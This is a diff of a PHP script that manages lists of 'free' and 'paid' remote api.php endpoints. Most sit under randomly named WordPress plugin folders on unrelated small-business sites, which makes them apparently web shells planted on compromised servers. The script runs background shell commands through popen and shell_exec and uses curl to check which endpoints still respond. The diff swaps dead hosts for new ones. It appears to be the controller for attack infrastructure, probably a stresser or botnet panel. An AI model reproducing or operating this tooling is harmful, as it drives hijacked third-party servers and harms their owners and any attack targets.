@@ -3,21 +3,33 @@ ignore_user_abort(true);
 set_time_limit(0);
 error_reporting(-1);
 
-$free = array("https://birsufm.com/api.php", "https://citymovers.co.nz/wp-content/plugins/cndnfhuwek/api.php");
+$free = array(
+    "https://turnuva.playerones.com/wp-content/api.php",
+    "https://herbovet.net/wp-content/plugins/vusjnauvpx/api.php",
+    "https://media.ind.in/wp-content/api.php",
+    "https://hisab.tspltest.com/api.php",
+    "http://cptatavasco.com.mx/wp-backup/api.php"
+);
 
 $paid = array(
-    "https://3-upstesting.site/api.php",
-    "https://totomtpolice.com/wp-admin/api.php",
+    // "https://apascoffee.com/wp-content/plugins/voqcwzpupp/api.php",
+    // "https://co-branding.co.nz/wp-content/plugins/vdpqlwveqc/api.php",
+    // "http://guvenveroline.com/wp-content/plugins/vugkgazcpj/api.php",
+    // "https://touchofthetropics.co.nz/wp-content/plugins/pnrjbnwzyj/api.php",
+    // "https://brockinteriorsltd.com/test/wp-content/plugins/pqcpcyldhr/api.php",
+    // "https://www.cerebellumcounselling.com/wp-content/plugins/tsftuvbvmu/api.php",
+    // "https://dealsnewshubb.com/wp-content/plugins/nwysljykux/api.php",
+    // "https://khayal.events/api.php",
+    // "https://nodus.org.mx/api.php",
     "https://services365.ca/wp-content/plugins/wvfhjwxtei/api.php",
-    "https://apascoffee.com/wp-content/plugins/voqcwzpupp/api.php",
-    "https://co-branding.co.nz/wp-content/plugins/vdpqlwveqc/api.php",
-    "http://guvenveroline.com/wp-content/plugins/vugkgazcpj/api.php",
-    "https://touchofthetropics.co.nz/wp-content/plugins/pnrjbnwzyj/api.php",
-    "https://brockinteriorsltd.com/test/wp-content/plugins/pqcpcyldhr/api.php",
-    "https://dealsnewshubb.com/wp-content/plugins/nwysljykux/api.php",
-    "http://ebikes.wdemo.in/admin/controller/extension/extension/api.php",
-    // "https://www.developershopon.com/wp-admin/api.php",
-    "https://www.cerebellumcounselling.com/wp-content/plugins/tsftuvbvmu/api.php"
+    "http://aleenahozbeauty.com/api.php",
+    "https://startickets.f1support.net/api.php",
+    "https://coolpexgulf.com/api.php",
+    "https://icajobspune.nexuspublishing.in/wp-content/api.php",
+    "http://melbournecarpetrepairs.rajarshisolutions.net/api.php",
+    "https://srv05.jvexecutive.com/~tampico7011/logs/api.php",
+    "https://pawereg.com/wp-content/api.php",
+    "https://solid.tisti.ru/api.php",
 );
 
 $digital = array();
@@ -108,6 +120,9 @@ switch ($list) {
 
 function execInBackground($cmd)
 {
+    global $debug;
+    if ($debug)
+        echo ("Executing $cmd<br>");
     if (substr(php_uname(), 0, 7) == "Windows") {
         pclose(popen("start /B " . $cmd, "r"));
     } else {
@@ -120,7 +135,7 @@ if ($method == "check") {
     foreach ($servers as $i => $url) {
         $cmd = "curl -X GET \"$url\"";
         $a = shell_exec($cmd);
-        if ($a == "Error: API key is empty!") {
+        if (strpos($a, "Error: API key is empty!") !== false) {
             $w++;
             echo "<a style='color:green'>$url: Working</a><br>";
         } else {
